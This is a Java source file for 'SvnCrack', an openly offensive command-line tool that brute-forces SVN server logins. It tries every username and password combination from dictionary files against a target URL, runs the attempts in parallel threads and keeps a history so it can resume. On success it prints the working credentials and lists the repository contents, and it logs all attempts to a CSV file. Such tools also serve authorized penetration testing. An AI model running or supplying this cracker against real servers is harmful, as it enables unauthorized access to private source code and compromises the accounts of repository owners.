import Utils.DictUtils;
import Utils.UserPassPair;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

import static Utils.DictUtils.*;
import static Utils.PrintLog.*;
import static Utils.SvnUtils.*;
import static Utils.UserPassPair.replaceUserMarkInPass;

import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;

@Command(name = "SvnCrack", description = "SVN Cracking Tool", version = "SvnCrack v0.1 20241113", mixinStandardHelpOptions = true)
public class SvnCrack implements Runnable{
    @Option(names = { "-t", "--target" }, required = true, description = "SVN login url, like svn://88.88.88.88:1688")
    // 设置 SVN 仓库的 URL
    private static String SVNLoginUrl = null;

    // 你要列出的目录路径 报错错的时候会提示实际目录
    @Option(names = { "-r", "--repo" }, description = "SVN repo path to check. like /data/svn/repo, not must need", defaultValue = "/")
    private static String SVNCheckPath= null;

    @Option(names = { "-U", "--user-dict" }, description = "User dict file path, default=user.txt", defaultValue = "user.txt")
    //账号文件
    private static String userDictPath= null;

    @Option(names = { "-P", "--pass-dict" }, description = "Pass dict file path, default=pass.txt", defaultValue = "pass.txt")
    //密码文件
    private static String passDictPath= null;

    public static void main(String[] args){
        int exitCode = new CommandLine(new SvnCrack()).execute(args);
        System.exit(exitCode);
    }

    @Override
    //run 方法：实现了 Runnable 接口，当命令行参数解析成功后，CommandLine.run 会调用这个方法。
    public void run() {
        if (SVNLoginUrl==null||SVNCheckPath==null||userDictPath==null||passDictPath==null) {
            print_error("参数输入不完整,请重新输入!!!");
            return;
        }

        List<String> userList = DictUtils.readDictFile(userDictPath);
        List<String> passList = DictUtils.readDictFile(passDictPath);

        if (userList.isEmpty()||passList.isEmpty()){
            System.out.printf("[!] Please Check!!! Read User Or Pass Dict Was Empty: USER:%s PASS:%s%n", userList.size(), passList.size() );
            return;
        }

        String historyFilePath = SVNLoginUrl.replace(":","_").replace("/","_") + ".history.log";
        String logRecodeFilePath = SVNLoginUrl.replace(":","_").replace("/","_")+ ".result.csv";
        String pairSeparator = ":";

        //加载加载账号字典
        List<UserPassPair> userPassPairList =  createCartesianUserPassPairs(userList, passList);

        //替换密码中的用户名变量
        String userMarkInPass = "%USER%";
        userPassPairList = replaceUserMarkInPass(userPassPairList, userMarkInPass);
        print_debug(String.format("Pairs Count After Replace Mark Str [%s]", userPassPairList.size()));

        //读取 history 文件,排除历史扫描记录 ，
        userPassPairList = excludeHistoryPairs(userPassPairList, historyFilePath, pairSeparator);
        print_debug(String.format("Pairs Count After Exclude History [%s] From [%s]", userPassPairList.size(), historyFilePath));

        //判断字典列表数量是否大于0
        if(userPassPairList.size() > 0){
            print_info(String.format("Read User Pass Dict End Current User:Pass Number[%s], Start SVN Crack...", userPassPairList.size()));
        } else {
            print_error(String.format("Read User Pass Dict End Current User:Pass Number[%s], Skip SVN Crack!!!", userPassPairList.size()));
            return;
        }

        //开始进行爆破
        try {
            //初始化SVN客户端
            initSvnSetup();

            // 创建线程池
            //int numberOfThreads = 5;
            int numberOfThreads = Runtime.getRuntime().availableProcessors();
            ExecutorService executorService = Executors.newFixedThreadPool(numberOfThreads);

            // 共享的标志变量
            final AtomicBoolean authenticationSuccessful = new AtomicBoolean(false);

            //进行日志记录
            String title = "SVN_URL,USERNAME,PASSWORD,STATUS";
            writeTitleToFile(logRecodeFilePath, title);

            // 进行爆破操作
            for (int index = 0; index < userPassPairList.size(); index++) {
                final int currentIndex = index;
                final UserPassPair userPassPair = userPassPairList.get(currentIndex);
                final List<UserPassPair> finalUserPassPairList = userPassPairList;

                executorService.submit(() -> {
                    // 如果已经成功认证，不再执行后续任务
                    if (authenticationSuccessful.get()) {
                        if (!executorService.isShutdown()) executorService.shutdown();
                        return;
                    }

                    // 记录任务开始时间
                    long taskStartTime = System.currentTimeMillis();

                    // 检查认证信息
                    String svnUser = userPassPair.getUsername();
                    String svnPass = userPassPair.getPassword();

                    if (checkAuthentication(SVNLoginUrl, svnUser, svnPass) == SUCCESS) {
                        System.out.printf("[+] %s/%s Authentication success: %s:%s%n", currentIndex + 1, finalUserPassPairList.size(), svnUser, svnPass);
                        authenticationSuccessful.set(true); // 设置成功标志
                        SVNRepositoryShow(SVNLoginUrl, SVNCheckPath, svnUser, svnPass);
                    }

                    //记录爆破历史
                    if (checkAuthentication(SVNLoginUrl, svnUser, svnPass) != ERROR) {
                        writeUserPassPairToFile(historyFilePath, pairSeparator, userPassPair);
                    }

                    //记录完整的爆破状态
                    String content = String.format("\"%s\",\"%s\",\"%s\",\"%s\"", SVNLoginUrl, svnUser, svnPass, authenticationSuccessful.get());
                    writeLineToFile(logRecodeFilePath, content);

                    if (currentIndex % 50 == 0) {
                        // 记录任务结束时间
                        double taskEndTime = System.currentTimeMillis() - taskStartTime;
                        long remainingTasks = finalUserPassPairList.size() - currentIndex;
                        double estimatedRemainingTime = taskEndTime * remainingTasks * 1.0 / 1000 / 60;
                        // 输出剩余时间
                        print_info(String.format("[%s/%s] Current Task Running Time:[%s]ms, Estimated Remaining Time:[%.2f]min -> [%.2f]hour",
                                currentIndex + 1,
                                finalUserPassPairList.size(),
                                taskEndTime,
                                estimatedRemainingTime,
                                estimatedRemainingTime/60)
                        );
                    }

                    // 如果已经成功认证，不再执行后续任务
                    if (authenticationSuccessful.get()) {
                        if (!executorService.isShutdown()) executorService.shutdown();
                        return;
                    }
                });
            }

            // 等待所有任务完成
            executorService.shutdown();
            executorService.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);

            // 检查是否成功认证
            if (!authenticationSuccessful.get()) {
                System.out.println("[-] GG! The password pairs of all accounts are not authenticated...");
            }

        } catch (InterruptedException e) {
            System.err.printf("Error Occurred: %s%n", e.getMessage());
            e.printStackTrace();
        }
    }
}